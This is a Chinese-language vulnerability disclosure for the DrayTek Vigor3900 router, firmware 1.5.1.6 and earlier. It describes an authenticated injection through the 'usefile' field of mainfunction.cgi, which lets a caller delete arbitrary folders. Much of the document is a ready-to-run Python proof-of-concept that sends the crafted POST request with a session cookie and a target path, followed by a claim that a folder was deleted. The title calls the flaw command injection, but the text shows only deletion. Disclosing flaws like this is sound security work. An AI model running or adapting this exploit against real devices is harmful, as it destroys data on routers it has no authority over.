# vigor3900中存在授权后的命令注入漏洞

## 1、基本信息

- 供应商：`DrayTek`
- 产品型号：`vigor3900`
- 影响版本：`<= 1.5.1.6`
- 漏洞类型：授权的命令注入

## 2、漏洞描述

`vigor3900`路由器的`1.5.1.6`固件版本的二进制文件中存在授权后的命令注入漏洞，漏洞位于`/www/cgi-bin/mainfunction.cgi`文件中，由于该文件在处理请求时，对相关字段的值进行过滤时考虑不当，导致任意文件的删除。

![image-20240817162743043](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817162743043.png)

我们可以控制`usefile`字段的值，从而控制`system`函数的执行，而`system`函数是对文件夹进行删除，这样恶意的攻击者可以传入指定的路径对相关文件夹进行删除。

## 3、漏洞验证

构建的POC如下，其中，要有相关的`Cookie`值。

```python
import requests

def send_post_request(ip_address, session_cookie, file_name):
    url = f"http://{ip_address}/cgi-bin/mainfunction.cgi"
   
    headers = {
        "Host": ip_address,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": session_cookie,
        "Connection": "close"
    }

    data = {
        "action": "jsonstatus",
        "usescript": "aaaa",
        "usefile": file_name
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

# 示例参数
ip_address = "10.10.10.2"
session_cookie = "SESSION_ID_VIGOR=7:2ECA2EBBA967426FE43909D9AE44CC75"
file_name = "/www/cgi-bin/jfkk"

# 调用函数并打印响应
response_text = send_post_request(ip_address, session_cookie, file_name)
print(response_text)
```

由下可以看出，我们成功删除了一个名为`jfkk`的文件夹，其虽然变为了`jfkk.lock`m，但是无法恢复

![image-20240817163913032](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817163913032.png)





